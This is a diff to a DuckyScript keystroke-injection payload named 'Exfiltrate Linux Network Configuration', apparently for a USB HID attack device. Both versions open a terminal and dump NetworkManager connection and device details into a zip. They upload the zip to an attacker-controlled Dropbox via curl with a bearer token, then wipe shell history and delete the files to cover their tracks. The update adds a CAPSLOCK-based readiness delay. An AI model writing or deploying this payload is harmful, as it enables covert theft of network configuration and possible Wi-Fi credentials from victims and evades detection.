@@ -1,96 +1,101 @@
-
-REM ##########################################################
-REM #                                                        |
-REM # Title        : Exfiltrate Linux Network Configuration  |
-REM # Author       : Aleff                                   |
-REM # Version      : 1.0                                     |
-REM # Category     : Exfiltration, Execution                 |
-REM # Target       : Linux                                   |
-REM #                                                        |
-REM ##########################################################
+REM_BLOCK
+##########################################################
+#                                                        #
+# Title        : Exfiltrate Linux Network Configuration  #
+# Author       : Aleff                                   #
+# Version      : 1.0                                     #
+# Category     : Exfiltration, Execution                 #
+# Target       : Linux                                   #
+#                                                        #
+##########################################################
+END_REM
 
 REM Requirements:
 REM     - Internet Connection
 REM     - Dropbox Account
 REM     - - DROPBOX_ACCESS_TOKEN
 
-DELAY 1000
-CTRL-ALT t
-
-DELAY 2000
 REM Required: Set here your Dropbox access TOKEN
-DEFINE TOKEN example
-STRING ACCESS_TOKEN="
-STRING TOKEN
-STRING "
-ENTER
+DEFINE #TOKEN example
 
-REM DELAY 500
-REM STRING USER_NAME=$(whoami)
-REM ENTER
+REM Set yout Dropbox folder name
+DEFINE #DROPBOX_FOLDER_NAME example
+
+REM This is just a Dropbox const, don't edit
+DEFINE #DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
+
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+CTRL-ALT t
+DELAY 2000
+STRINGLN ACCESS_TOKEN="#TOKEN"
 
 DELAY 500
-STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
-ENTER
+STRINGLN USER_NAME=$(whoami)
 
 DELAY 500
-STRING ZIP_NAME="$RANDOM.zip"
-ENTER
+STRINGLN RANDOM=$(shuf -i 1-999999999999 -n 1)
+
 DELAY 500
-STRING ZIP_PATH="/home/$USER_NAME/Documents/$ZIP_NAME"
-ENTER
+STRINGLN ZIP_NAME="$RANDOM.zip"
+DELAY 500
+STRINGLN ZIP_PATH="/home/$USER_NAME/Documents/$ZIP_NAME"
 
 REM Folder path
 DELAY 500
-STRING TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/Documents" prefix-XXXXXXXXXX)
-ENTER
+STRINGLN TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/Documents" prefix-XXXXXXXXXX)
 
 DELAY 500
-STRING nmcli > "$TMP_FOLDER_PATH/nmcli.txt"
-ENTER
+STRINGLN nmcli > "$TMP_FOLDER_PATH/nmcli.txt"
 
 DELAY 1000
-STRING nmcli connection show > "$TMP_FOLDER_PATH/nmcli_connection.txt"
-ENTER
+STRINGLN nmcli connection show > "$TMP_FOLDER_PATH/nmcli_connection.txt"
 
 DELAY 1000
-STRING nmcli device show > "$TMP_FOLDER_PATH/nmcli_device.txt"
-ENTER
+STRINGLN nmcli device show > "$TMP_FOLDER_PATH/nmcli_device.txt"
 
 DELAY 1000
 REM Delay for zipping operation, it depends by computer power and folder directory
 STRING zip -r "$ZIP_PATH" "$TMP_FOLDER_PATH"
 DELAY 3000
 
-
-REM Set yout Dropbox folder name
-DEFINE DROPBOX_FOLDER_NAME example
-STRING DROPBOX_FOLDER="/
-ENTER
-STRING DROPBOX_FOLDER_NAME
-ENTER
-STRING "
-ENTER
+STRINGLN DROPBOX_FOLDER="/#DROPBOX_FOLDER_NAME"
 DELAY 500
 
-DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
-STRING curl -X POST
-STRING DROPBOX_API_CONST
-STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
-ENTER
+
+STRINGLN curl -X POST#DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
 
 DELAY 2000
-STRING history -c
-ENTER
+STRINGLN history -c
 
 DELAY 500
-STRING rm -rf "$TMP_FOLDER_PATH"
-ENTER
+STRINGLN rm -rf "$TMP_FOLDER_PATH"
 
 DELAY 500
-STRING rm -rf "$ZIP_PATH"
-ENTER
-
-DELAY 500
-STRING exit
-ENTER
+STRINGLN rm -rf "$ZIP_PATH"; exit
